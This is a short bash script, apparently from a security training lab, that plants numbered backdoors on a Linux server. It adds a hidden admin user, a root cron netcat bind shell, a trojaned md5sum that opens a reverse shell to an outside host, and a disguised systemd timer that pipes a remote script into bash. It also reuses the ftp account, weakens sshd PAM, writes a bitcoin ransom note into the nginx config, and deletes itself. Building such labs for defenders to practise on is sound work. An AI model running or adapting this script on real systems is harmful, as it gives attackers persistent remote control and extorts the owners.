#!/bin/bash

# backdoor number 1 is build into the dockerfile

# create evil user (2)
useradd -M -s /bin/bash -G wheel very_important_account
echo "very_important_account:IAMAHACKER" | chpasswd

# create backdoor listener (3)
echo "*/1 * * * * root /usr/bin/nc -e /bin/bash -l 666 &" >> /etc/crontab

# create a reverse shell in the md5sum command (4)
cat > /usr/local/bin/md5sum <<- EOM
#!/bin/bash
(nc -e /bin/bash $(dig +short web0.linux.spicelab.org) 4444 ) &>/dev/null &
/usr/bin/md5sum \$1
EOM
chmod +x /usr/local/bin/md5sum

# create evil systemD timer (5)
cat > /etc/systemd/system/cleanup.service <<- EOM
[Unit]
Description=Prints date into /tmp/date file

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/usr/bin/curl web0.linux.spicelab.org:8080/run.sh | /bin/bash"
EOM

cat > /etc/systemd/system/cleanup.timer <<- EOM
[Unit]
Description=Import system configuration

[Timer]
OnCalendar=*:0/2

[Install]
WantedBy=timers.target
EOM

systemctl enable cleanup.timer
systemctl enable cleanup.service
systemctl start cleanup.timer
systemctl start cleanup.service

# repurpose a system account (6)
chsh -s /bin/bash ftp
echo "ftp:cybersec" | chpasswd
usermod -a -G wheel ftp

# start the udp reverse shell (7)
#/root/.c &

# configure the PAM backdoor (8)
if [ -s /usr/lib64/security/pam_extra.so ]
then
  sed -i '2 s/required/sufficient/' /etc/pam.d/sshd
  sed -i "2 a auth      sufficient    pam_extra.so  $(dig +short web0.linux.spicelab.org)" /etc/pam.d/sshd
fi

# break the web server
echo "
ATTENTION

Your web server has been hacked!

Send 1 bitcoin to the address below:
1MCwBbhNGp5hRm5rC1Aims2YFRe2SXPYKt

You will never be able to stop me! I have too many backdoors in your system.

If you don't pay soon, I will destroy everything!3

" >> /etc/nginx/nginx.conf

systemctl stop nginx

touch /home/admin/.a_hacker_is_in_your_ram

# have this script delete itself
rm /root/do_evil.sh
